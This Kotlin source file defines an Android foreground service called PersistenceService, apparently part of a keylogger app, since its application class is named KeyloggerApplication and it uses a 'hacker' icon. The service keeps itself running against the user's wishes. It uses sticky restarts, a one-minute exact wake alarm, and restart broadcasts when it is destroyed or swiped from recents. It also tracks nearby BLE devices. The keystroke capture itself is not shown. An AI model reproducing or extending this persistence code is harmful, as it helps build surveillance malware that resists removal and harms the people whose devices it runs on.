package com.android.myapp.service

import android.app.AlarmManager
import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Binder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.android.myapp.KeyloggerApplication
import com.android.myapp.R
import com.android.myapp.core.BatteryConfig
import com.android.myapp.receiver.BootCompletedReceiver
import com.android.myapp.receiver.ServiceRestartReceiver
import com.android.myapp.ui.DashboardActivity
import timber.log.Timber

/**
 * Foreground service to maintain app persistence
 */
class PersistenceService : Service() {

    private val binder = LocalBinder()
    private val handler = Handler(Looper.getMainLooper())

    // persistence monitoring state
    private var lastBleDevicesSeen = 0
    private var lastWakeSource = "unknown"
    private var serviceStartTime = 0L

    private var persistenceCheckRunnable: Runnable? = null

    inner class LocalBinder : Binder() {
        fun getService(): PersistenceService = this@PersistenceService
    }
    companion object {

        private const val TAG = "PersistenceService"

        private const val NOTIFICATION_ID = 1002

        private const val RESTART_ALARM_INTERVAL = 60_000L // 1 minute

        @Volatile
        var isRunning = false
            private set

        @Volatile
        var instance: PersistenceService? = null
            private set

        fun isServiceRunning(context: Context): Boolean {
            val sp = context.getSharedPreferences("svc_state", Context.MODE_PRIVATE)
            return sp.getBoolean("persistence_running", false)
        }
    }

    override fun onBind(intent: Intent?): IBinder {
        return binder
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "═══════════════════════════════════════")
        Log.d(TAG, "PersistenceService onCreate")


        instance = this
        isRunning = true
        serviceStartTime = System.currentTimeMillis()

        setRunning(true)

        Log.d(TAG, "Service instance created")
        Log.d(TAG, "Power Profile: ${BatteryConfig.currentProfile}")
        Log.d(TAG, "═══════════════════════════════════════")
    }

    private fun setRunning(running: Boolean) {
        getSharedPreferences("svc_state", MODE_PRIVATE)
            .edit()
            .putBoolean("persistence_running", running)
            .putLong("persistence_last_update", System.currentTimeMillis())
            .apply()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand - action: ${intent?.action}, startId: $startId")

        // Get wake source if provided
        lastWakeSource = intent?.getStringExtra("wake_trigger") ?: "direct_start"

        // Start as foreground service with proper type
        startForegroundWithType()

        // Start persistence monitoring
        startPersistenceMonitoring()

        // Start as foreground service
        startForeground()

        // Schedule restart alarm
        scheduleRestartAlarm()

        return START_STICKY // Restart service if killed
    }

    /**
     * Start the main persistence monitoring loop.
     * Uses BatteryConfig for persistence check interval.
     */
    private fun startPersistenceMonitoring() {
        Log.d(TAG, "Starting persistence monitoring (interval: ${BatteryConfig.servicePersistenceCheckMs / 1000}s)...")

        // Remove any existing runnable
        persistenceCheckRunnable?.let { handler.removeCallbacks(it) }

        // persistence check based on BatteryConfig interval
        persistenceCheckRunnable = object : Runnable {
            override fun run() {
                performPersistenceCheck()
                handler.postDelayed(this, BatteryConfig.servicePersistenceCheckMs)
            }
        }

        handler.postDelayed(persistenceCheckRunnable!!, BatteryConfig.servicePersistenceCheckMs)
    }

    /**
     * Perform periodic persistence check.
     */
    private fun performPersistenceCheck() {
        val uptime = (System.currentTimeMillis() - serviceStartTime) / 1000
        Log.d(TAG, "persistence check - uptime: ${uptime}s, lastWake: $lastWakeSource, bleDevices: $lastBleDevicesSeen, profile: ${BatteryConfig.currentProfile}")

        // Update notification with status
        updateNotification()
    }

    /**
     * Called when BLE devices are seen (from mesh wake system).
     */
    fun onBleDevicesSeen(count: Int) {
        lastBleDevicesSeen = count
        Log.d(TAG, "BLE devices seen: $count")
    }

    /**
     * Start foreground service with correct type for Android 14+
     */
    private fun startForegroundWithType() {
        val notification = createNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ - must specify foreground service type
            ServiceCompat.startForeground(
                this,
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10-13
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else {
            // Android 9 and below
            startForeground(NOTIFICATION_ID, notification)
        }

        Log.d(TAG, "Foreground service started with connectedDevice type")
    }

    private fun startForeground() {
        val notification = createNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    /**
     * Create the foreground notification.
     */
    private fun createNotification(): Notification {

        val pendingIntent = null
        // remove the comments and replace the null in order to open the dashboard through the notification
        /*
            PendingIntent.getActivity(
            this,
            0,
            Intent(this, DashboardActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        */

        val uptime = if (serviceStartTime > 0) {
            (System.currentTimeMillis() - serviceStartTime) / 1000
        } else {
            0L
        }

        val profileEmoji = when (BatteryConfig.currentProfile) {
            BatteryConfig.PowerProfile.AGGRESSIVE -> "🔴"
            BatteryConfig.PowerProfile.BALANCED -> "🟡"
            BatteryConfig.PowerProfile.BATTERY_SAVER -> "🟢"
        }

        return NotificationCompat.Builder(this, KeyloggerApplication.CHANNEL_SERVICE)
            .setContentTitle("persistence service is Active $profileEmoji")
            .setContentText("${BatteryConfig.currentProfile} • ${formatUptime(uptime)}")
            .setSmallIcon(R.drawable.icon_hacker)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .addAction(
                R.drawable.icon_hacker,
                "View Status",
                pendingIntent
            )
            .build()
    }

    /**
     * Update the notification with current status.
     */
    private fun updateNotification() {
        val notification = createNotification()
        val notificationManager = getSystemService(android.app.NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    /**
     * Format uptime for display.
     */
    private fun formatUptime(seconds: Long): String {
        return when {
            seconds < 60 -> "${seconds}s"
            seconds < 3600 -> "${seconds / 60}m ${seconds % 60}s"
            else -> "${seconds / 3600}h ${(seconds % 3600) / 60}m"
        }
    }

    private fun scheduleRestartAlarm() {
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager

        val intent = Intent(this, BootCompletedReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            0,
            intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        // Schedule repeating alarm
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + RESTART_ALARM_INTERVAL,
                    pendingIntent
                )
            } else {
                alarmManager.setRepeating(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + RESTART_ALARM_INTERVAL,
                    RESTART_ALARM_INTERVAL,
                    pendingIntent
                )
            }
            Timber.Forest.d("Restart alarm scheduled")
        } catch (e: Exception) {
            Timber.Forest.e(e, "Failed to schedule restart alarm")
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "═══════════════════════════════════════")
        Log.d(TAG, "persistenceMonitorService onDestroy")

        setRunning(false)

        isRunning = false
        instance = null
        handler.removeCallbacksAndMessages(null)

        // Trigger restart via broadcast
        sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))

        Log.d(TAG, "Service destroyed - restart triggered")
        Log.d(TAG, "═══════════════════════════════════════")
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "onTaskRemoved - app swiped from recents")

        // Trigger restart
        sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))

        super.onTaskRemoved(rootIntent)
    }
}